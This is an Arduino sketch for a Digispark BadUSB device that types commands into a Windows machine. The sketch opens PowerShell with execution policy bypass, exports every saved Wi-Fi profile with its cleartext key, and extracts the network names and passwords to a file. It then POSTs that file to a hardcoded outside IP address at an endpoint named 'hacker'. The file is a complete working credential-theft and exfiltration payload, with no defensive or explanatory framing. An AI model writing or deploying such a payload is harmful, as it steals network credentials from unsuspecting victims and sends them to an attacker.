 #include "DigiKeyboardPtBr.h"
 
void setup() {
  pinMode(1, OUTPUT);      // LED on Model B
}

void loop() {
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("powershell -nop -exec bypass");
  DigiKeyboardPtBr.delay(500);

  DigiKeyboardPtBr.println("cd $env:temp");
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.println("netsh wlan export profile key=clear");
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.print("Select-String -Path Wi*.xml -Pattern '<name>(.*)</name>','<keyMaterial>(.*)</keyMaterial>' ");
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.sendKeyStroke(0x64,MOD_SHIFT_LEFT); // pipe caracter "|"
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.print(" Foreach-Object {$_.Matches} ");
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.sendKeyStroke(0x64,MOD_SHIFT_LEFT); // pipe caracter "|"
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.print(" Foreach-Object {$_.Groups[1].Value} > temp.csv");
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(1000);
  
  DigiKeyboardPtBr.println("Invoke-WebRequest -Uri http://137.184.97.125:3000/hacker -Method 'POST' -ContentType 'text/plain' -Body $(cat .\\temp.csv)");
  DigiKeyboardPtBr.delay(500);

  digitalWrite(1, HIGH);   // Turn the LED on

  for(;;){ /*empty*/ }
}
